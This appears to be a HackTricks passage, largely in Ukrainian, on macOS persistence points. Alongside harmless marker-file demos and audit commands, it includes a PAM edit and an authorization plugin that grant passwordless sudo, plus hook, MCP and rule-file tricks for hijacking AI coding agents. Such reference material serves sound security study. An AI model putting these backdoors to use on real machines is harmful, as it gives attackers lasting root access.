for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Розширення віджета запускається у **власному процесі**, і його додавання **не викликає** сповіщення Background Task Management
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Файл конфігурації plist міститься в контейнері, захищеному TCC, тому для його редагування ззовні потрібен Full Disk Access або обхід TCC

#### Розташування

- Пакет розширення віджета: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Активні/зареєстровані віджети: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (ключі `widgets.instances` і `widgets.widgets`)

#### Опис і експлуатація

Розширення WidgetKit, що постачається всередині програми, запускається у **власному процесі**, яким керує Notification Center. Реєстрація екземпляра в `widgets.instances` (blob `CHSWidget` у форматі base64, закодований за допомогою `NSKeyedArchiver` і з вбудованими даними `INIntent`) і перезапуск NotificationCenter змушують віджет завантажитися та виконати код `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Корисно для bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Mail.app має бути налаштований з обліковим записом і запущений; тригером є вхідний email
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Редагування правил/скриптів поза Mail може вимагати закриття Mail і надання Full Disk Access у сучасних версіях macOS

#### Розташування

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (локальні правила; `V10` у Sonoma/Sequoia, `V11`+ у новіших версіях)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (правила, синхронізовані через iCloud; мають пріоритет)
- Активність правил: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Опис і експлуатація

Правило Apple Mail може містити дію *"Run AppleScript"*. Додавши правило, яке відповідає спеціально сформованому **рядку теми** й запускає скрипт зловмисника, adversary отримує **віддалено запускане, приховане** виконання коду в контексті Mail щоразу, коли надходить магічний email — цей вектор обходить багато сканерів persistence, оскільки LaunchAgent/Login Item не створюється.<sup>[[42]](#references)</sup> Якщо налаштувати правило на **видалення** email-тригера, сліди буде приховано. Захисники можуть шукати його безпосередньо:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Профілі конфігурації (.mobileconfig)

Опис: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Корисно для bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - У сучасній macOS потрібне **ручне підтвердження користувача** в System Settings → *Device Management* (тиха команда `profiles install` більше недоступна поза MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Встановлені профілі містяться в **`/Library/Managed Preferences/`** і **`/var/db/ConfigurationProfiles/`**; профіль — це XML plist з масивом `PayloadContent`.

#### Опис і експлуатація

`.mobileconfig` не є засобом безпосереднього виконання коду, але він може забезпечувати збереження конфігурації, наприклад **довіреного кореневого CA** (`com.apple.security.root`), **глобального проксі або PAC** (`com.apple.proxy.*`), **керованих параметрів** (`com.apple.ManagedClient.preferences`) або обмежень. У macOS 10.15 і новіших версіях, згідно з визначенням Apple [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel), встановлення значення `true` для **вручну встановленого** профілю без payload із паролем для видалення вимагає **автентифікації адміністратора**, щоб видалити його; це не робить профіль абсолютно невидалим. Для профілів, встановлених через MDM, діють окремі правила керування та видалення.<sup>[[44]](#references)</sup>

> [!WARNING]
> Звичайний профіль конфігурації **не має типу payload, який встановлює довільний `LaunchDaemon`/`LaunchAgent`**. Для встановлення daemon таким способом потрібні повне **зарахування до MDM** і агент/скрипт керування — не вважайте `.mobileconfig` механізмом доставки launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **видаляє** `DYLD_*` для SIP/platform binaries, hardened-runtime apps і setuid targets, тож ін’єкція відбувається лише в незахищені процеси й **не** обходить SIP/hardened runtime
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Надійний варіант: словник **`EnvironmentVariables`** у шкідливому plist-файлі `LaunchAgent`/`LaunchDaemon` (запускається під час входу в систему/завантаження)
- Неактуальні/історичні (лише для звітів): **`~/.MacOSX/environment.plist`** (видалено в 10.8) і **`/etc/launchd.conf`** (видалено в 10.10)

#### Опис і експлуатація

Якщо зловмисник може додати `DYLD_INSERT_LIBRARIES` до середовища процесу жертви, dyld завантажить dylib зловмисника (виконається його конструктор) у цей процес. Варіант із persistence додає цю змінну до LaunchAgent, щоб кожен запуск завдання повторно виконував ін’єкцію. Зверніть увагу: у сучасних версіях macOS `launchctl setenv DYLD_*` фільтрується, тому натомість додайте її до plist-файлу.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Для повного опису механізмів dylib injection/hijacking див.:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI AI coding agents (hooks, MCP servers, файли правил)

Публікації: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Бекдор у файлі правил (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібно, щоб розробник використовував відповідного агента. Команди запуску виконуються з привілеями цього користувача, коли агент приймає його конфігурацію; довіра до workspace та схвалення MCP залежать від продукту й режиму сеансу.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (виконується від імені користувача; успадковує всі наявні дозволи термінала/агента)

#### Розташування

Файли явної конфігурації hooks і MCP можуть запускати **shell-команди або дочірні процеси, коли розробник користується інструментом** — або з глобального файлу користувача (persistence), або з файлу, доданого до репозиторію (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` і правила редактора — це **інструкції для агента**, а не гарантований запуск shell-команд під час читання; їхній вплив залежить від поведінки агента та дозволів на використання інструментів. Перевіряйте актуальні правила довіри й схвалення для кожного продукту.

- **Claude Code**
  - `~/.claude/settings.json`, проєктний `.claude/settings.json`, `.claude/settings.local.json` і доступний лише root-файлу **`/Library/Application Support/ClaudeCode/managed-settings.json`** (налаштування MDM/керовані налаштування **не можуть бути перевизначені** користувачем → надійний persistence)
  - Об’єкт `hooks` — події `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — кожна запускає shell-команду `command`
  - `statusLine.command` — shell-команда, що виконується для відображення рядка стану (у кожному сеансі)
  - MCP servers у `~/.claude.json` / проєктному `.mcp.json` — `command`+`args` запускаються як дочірні процеси
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — інструкції, які можуть намагатися виконати prompt injection; результат залежить від поведінки агента та дозволів на використання інструментів
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` запускаються як дочірні процеси); інструкції проєкту в `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … запускають команди); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; інструкції GitHub Copilot у `.github/copilot-instructions.md`

#### Опис і експлуатація

Якщо зловмисник може змінювати глобальні налаштування користувача, його hook або MCP-команди можуть запускатися в майбутніх сеансах від імені цього облікового запису. Конфігурація, контрольована репозиторієм, — це окремий випадок: [поточна документація з безпеки Claude Code](https://code.claude.com/docs/en/security) описує інтерактивне діалогове вікно довіри до workspace та окремий запит на схвалення серверів проєктного `.mcp.json`. [Таблиця дозволів](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) вказує, що hooks можуть запускатися після того, як батьківській папці надано довіру, а сеанси `claude -p`/SDK не показують інтерактивний запит довіри; у цих неінтерактивних режимах проєктні MCP servers підключаються без запиту на схвалення. Обхід проєктних hooks до надання довіри, про який повідомлялося як про CVE-2025-59536, [виправили у 2025 році](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); не вважайте це типовою поточною поведінкою. Вектори доставки можуть включати скомпрометований репозиторій або шкідливий інсталятор. Prompt injection через файл правил менш передбачуваний, ніж явний hook, і все одно залежить від схвалення використання інструментів.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Приклад глобальних налаштувань користувача для Claude Code; для тестування використовуйте їх лише в одноразовому обліковому записі:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Приклад глобальної конфігурації Codex MCP для користувача:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Приклад конфігурації hook у Cursor; перед використанням перевірте схему встановленої версії:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Розширення браузера (Chromium: Chrome / Brave / Edge)

Опис: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібен підтримуваний браузер і встановлене, увімкнене розширення. External Extensions у macOS вимагають підтвердження користувача; примусове встановлення через керовану політику вимагає відповідної корпоративної політики.
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Це відрізняється від **native messaging hosts** (див. розділ *Chrome native messaging hosts* вище). У цьому випадку механізмом persistence є саме **автоматично встановлене розширення**.

#### Розташування

- **JSON-файли External Extensions** (виявляються під час запуску браузера, після чого в macOS з’являється запит на ввімкнення):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (для користувача) або `/Library/Application Support/Google/Chrome/External Extensions/` (для всіх користувачів)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Примусове встановлення через корпоративну політику** за допомогою керованих налаштувань / профілю конфігурації:
  - ключ `ExtensionInstallForcelist` у `com.google.Chrome` (у Brave — `com.brave.Browser`, в Edge — `com.microsoft.Edge`); читається з `/Library/Managed Preferences/` або встановленого `.mobileconfig`

#### Опис і експлуатація

Це два різні способи встановлення. У документації Chrome про [зовнішнє встановлення](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) зазначено, що користувачі Windows і macOS **мають підтвердити та ввімкнути** розширення, запропоноване через файл *External Extensions*; воно не запускається лише через створення цього JSON-файлу. Для встановлення для всіх користувачів у macOS Chrome також вимагає, щоб файл зовнішнього розширення був захищений від змін із непривілейованого облікового запису. Керована політика `ExtensionInstallForcelist` або `ExtensionSettings` може встановити й закріпити розширення без взаємодії з користувачем; у [посібнику Google з політик для Mac](https://support.google.com/chrome/a/answer/7517624) описано керовану конфігурацію та зазначено, що користувач не може видалити примусово встановлені розширення. Це шлях розгортання через політику, а не короткий шлях із `defaults write` для окремого користувача.<sup>[[49]](#references)</sup>

> [!WARNING]
> У macOS JSON-маніфест *External Extensions* має вказувати на URL оновлення **Chrome Web Store**, а не на локальний CRX-файл. Для розгортання через керовану політику діють окремі корпоративні вимоги; воно може дозволяти керований URL оновлень із власного сервера. Для локального розпакованого розширення в тестовому профілі перемикач режиму розробника Chrome `--load-extension=/path` є окремим механізмом і не робить JSON-файл External Extensions таким, що виконується автоматично. Не вважайте запис у `Secure Preferences` рівнозначним жодному з описаних способів реєстрації.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Запустіть Chrome у цьому одноразовому обліковому записі й перегляньте запит на ввімкнення; після прийняття користувачем поведінка самого розширення є PoC виконання. Після тесту видаліть manifest і вимкніть або видаліть розширення в цьому профілі. Цей шлях **не** перевірявся в активному профілі Chrome на дослідницькому Mac. Маршрут через керовану політику там також не використовувався.

Force-install і External Extensions посилаються на ідентифікатори розширень **Chrome Web Store**; про низькорівневий трюк із прихованим впровадженням локального розширення шляхом редагування підписаного HMAC файлу профілю `Secure Preferences` та інші зловживання процесами Chromium дивіться:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Обробники URL-схем і типів файлів (LaunchServices)

Опис: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Тригером є натискання жертвою посилання (наприклад, у Chrome/Brave/Safari) або відкриття файлу зареєстрованого типу
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `Info.plist` пакета програми, де оголошено **`CFBundleURLTypes`/`CFBundleURLSchemes`** (власна URL-схема) або **`CFBundleDocumentTypes`** (розширення файлу/UTI)
- Ефективні налаштування за замовчуванням для користувача можуть міститися в масиві **`LSHandlers`** файлу **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**. Підтримуваний Apple API для вибору обробника URL-схеми за замовчуванням — `LSSetDefaultHandlerForURLScheme`; пряме редагування цього plist не є документованим способом реєстрації чи оновлення кешу.

#### Опис і експлуатація

Launch Services отримує відомості про URL-схеми й типи документів із `Info.plist` зареєстрованої програми. У [посібнику Apple з реєстрації](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) зазначено, що реєстрація може відбутися, коли Finder виявляє програму, під час завантаження або входу в систему чи через явний API реєстрації; просте розміщення програми в якомусь місці не гарантує негайного запуску цього процесу. Після реєстрації відкриття відповідної URL-адреси або документа може запустити вибрану програму-обробник з урахуванням вибору користувача щодо обробника за замовчуванням і звичайних перевірок запуску macOS. Підтримуваний API `LSSetDefaultHandlerForURLScheme` змінює URL-обробник, якому користувач надає перевагу; він не змушує автоматично запускатися щойно додану програму.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Жоден застосунок не реєстрували й жодні налаштування обробників не змінювали на тестовому Mac із macOS 26.5.2. Щоб протестувати реальний обробник, скористайтеся одноразовим обліковим записом користувача, зареєструйте застосунок, який лише створює маркер, із унікальною схемою, викличте його URL, а потім видаліть застосунок і його реєстрацію.

Докладніше про перерахування та зловживання обробниками розширень файлів і URL-схем дивіться в:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Файли запуску Python (`.pth` / `.start` / `usercustomize` / `sitecustomize`)

Опис: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Може бути корисним для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Виконується під час запуску відповідного інтерпретатора Python, якщо для нього ввімкнено цей каталог `site`; тригер не є універсальним для всіх virtual environments, збірок Python і прапорців запуску
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Виконується з привілеями та доступом TCC процесу, який запустив інтерпретатор

#### Розташування

- **`$(python3 -m site --user-site)/*.pth`** (збірки macOS framework: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Права root не потрібні (каталог доступний для запису користувачу)
  - **Тригер**: запуск цієї збірки Python із увімкненим user site; модуль `site` обробляє файли `.pth` в активних каталогах `site`
- **`<site-packages>/*.start`** (Python 3.15+; каталог користувача або інтерпретатора)
  - **Тригер**: запуск інтерпретатора, який містить цей каталог і завантажує `site`.<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - Права root не потрібні
  - **Тригер**: запуск із увімкненим user site (імпортується автоматично модулем `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (наприклад, `/opt/homebrew/lib/python3.13/site-packages/` або системні шляхи)
  - Залежно від розташування інтерпретатора можуть знадобитися права root/admin
  - **Тригер**: запуск інтерпретатора, який містить цей каталог `site`

#### Опис і експлуатація

Під час запуску Python зазвичай імпортує `site` і шукає файли `.pth` в активних каталогах `site-packages`. Рядок `.pth`, що починається з `import `, не лише додає шляхи, а й виконує код Python, навіть якщо вказаний модуль більше ніде не використовується. Python також намагається імпортувати `sitecustomize` і, **якщо user site увімкнено**, `usercustomize`.<sup>[[56]](#references)</sup> Тригером є подальший запуск інтерпретатора, який бачить змінений каталог. Прапорець `-S` вимикає обробку `site`; `-s`, `-I` або `PYTHONNOUSERSITE` вимикають варіанти **user site**. Зазвичай `-I` не вимикає глобальний `sitecustomize`. Virtual environments також можуть виключати user site. Перевірте `python3 -m site` для конкретного інтерпретатора.

У **Python 3.15 і новіших версіях** каталог `site` також може містити файл `<name>.start` із точкою входу `pkg.mod:callable`. Модуль `site` імпортує цей модуль і викликає функцію без аргументів під час запуску інтерпретатора, навіть якщо застосунок ніколи не імпортує пакет. Наприклад, файл `foo.start` із вмістом `foo.submod:initialize` викликає `foo.submod.initialize()` до виконання коду користувача. Пакет або актор, який може записувати дані в активний каталог `site`, може використати цей шлях запуску; він не обмежений macOS. Якщо `foo.start` міститься поруч із `foo.pth`, Python 3.15+ пропускає рядки імпорту з `.pth` на користь точки входу `.start`, тоді як старіші інтерпретатори ігнорують `.start` і виконують рядок із `.pth`. Цю різницю між версіями слід враховувати під час тестування wheel у різних інтерпретаторах.<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

Наведений нижче PoC запускали на macOS 26.5.2. Для цього тесту `PYTHONUSERBASE` перенаправляє user site до тимчасового каталогу; реальний user site не змінюється:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Обидва маркери з’явилися. Повторний запуск із `-s`, `-I` або `-S` запобіг появі обох маркерів **user-site** у цьому тесті. `sitecustomize` у глобальному каталозі site не тестувався.

## Обхід Sandbox із правами root

> [!TIP]
> Тут ви знайдете точки автозапуску, корисні для **sandbox bypass**, що дають змогу просто виконати щось, **записавши це у файл**, маючи права **root** та/або за наявності інших **дивних умов**.

### Periodic

> [!CAUTION]
> **Історичний механізм:** На тестовій машині з macOS 26.5.2 відсутні `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` і агенти запуску `com.apple.periodic-*`. Не припускайте, що створення `/etc/periodic` у поточній системі запланує виконання його вмісту. Перш ніж використовувати наведений нижче приклад, перевірте на цільовій версії наявність і команди, і ввімкненого планувальника.

Опис: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Потрібні права root
  - **Тригер**: Коли настане час
- `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
  - Потрібні права root
  - **Тригер**: Коли настане час

#### Опис і експлуатація

У старіших версіях скрипти periodic (**`/etc/periodic`**) запускалися за розкладом **агентами запуску** в `/System/Library/LaunchDaemons/com.apple.periodic*`. Починаючи з macOS Big Sur 11.5, засіб запуску periodic виконував скрипти в каталогах periodic від імені **власника кожного файлу**, усунувши попередній шлях до підвищення привілеїв.<sup>[[27]](#references)</sup> Наведені нижче команди та списки каталогів — це історичний вивід, а не результат тестування macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Інші періодичні скрипти, які виконуватимуться, зазначено в **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

У старіших системах, де встановлено й увімкнено `periodic` і його launch daemons, `/etc/daily.local`, `/etc/weekly.local` і `/etc/monthly.local` були додатковими шляхами виконання. Безпечна перевірка лише для читання:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Правило на основі власника застосовувалося до скриптів безпосередньо в періодичних каталогах. Історична обгортка `999.local` раніше підключала `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local` без такої ж перевірки власника; коли планувальник запускався від root, ці локальні файли запускалися від root. Цю відмінність і зміну в Big Sur 11.5 описано в [оригінальному дослідженні](https://theevilbit.github.io/beyond/beyond_0019/). Не слід вважати, що будь-який із цих шляхів активний, якщо `periodic` відсутній.

### PAM

Матеріал: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Матеріал: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але для цього потрібні права root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Завжди потрібні права root

#### Опис і експлуатація

Оскільки PAM більше орієнтований на **persistence** і шкідливе ПЗ, ніж на простий запуск усередині macOS, у цьому блозі не наведено докладного пояснення; **прочитайте матеріали, щоб краще зрозуміти цю техніку**.<sup>[[28]](#references)</sup>

Перевірте модулі PAM за допомогою:

```bash
ls -l /etc/pam.d
```

Техніка закріплення/підвищення привілеїв із використанням PAM реалізується простим редагуванням модуля /etc/pam.d/sudo: на початку потрібно додати рядок:

```bash
auth       sufficient     pam_permit.so
```

Тож це **виглядатиме** приблизно так:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

І тому будь-яка спроба використати **`sudo` спрацює**.

> [!CAUTION]
> Зверніть увагу, що цей каталог захищений TCC, тому користувач, імовірно, побачить запит на доступ.

Ще один хороший приклад — su: тут можна побачити, що модулям PAM також можна передавати параметри (а цей файл також можна було б бекдорнути):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Плагіни авторизації

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Корисний для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root і додаткові конфігурації
- Обхід TCC: ???

#### Розташування

- `/Library/Security/SecurityAgentPlugins/`
  - Потрібні права root
  - Також потрібно налаштувати базу даних авторизації для використання плагіна

#### Опис і експлуатація

Ви можете створити плагін авторизації, який запускатиметься під час входу користувача в систему, щоб підтримувати persistence. Щоб дізнатися більше про створення таких плагінів, перегляньте попередні writeup (і будьте обережні: погано написаний плагін може заблокувати вам доступ, і тоді доведеться очищати Mac у режимі відновлення).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Перемістіть bundle до розташування, звідки його буде завантажено:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Нарешті додайте **правило** для завантаження цього плагіна:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

